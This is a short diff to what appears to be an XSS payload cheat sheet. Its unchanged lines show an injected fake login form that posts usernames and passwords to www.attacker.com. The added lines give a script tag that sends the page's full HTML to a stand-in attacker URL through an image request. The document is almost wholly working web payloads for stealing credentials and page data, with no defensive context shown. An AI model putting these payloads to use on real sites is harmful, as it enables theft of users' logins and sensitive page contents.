@@ -49,4 +49,8 @@ Submits credentials to the www.attacker.com (Embeds Login Screen inside applicat
 <h3>Please login to proceed</h3> <form action=http://www.attacker.com>Username:<br><input type="username" name="username"></br>Password:<br><input type="password" name="password"></br><br><input type="submit" value="Logon"></br>
 ```
 
-
+Collect page source code (may contian sensitive data)
+----------------------------
+```
+<script>new Image().src="https://www.attacker.com/bogus.php?output="+document.body.innerHTML</script>
+```
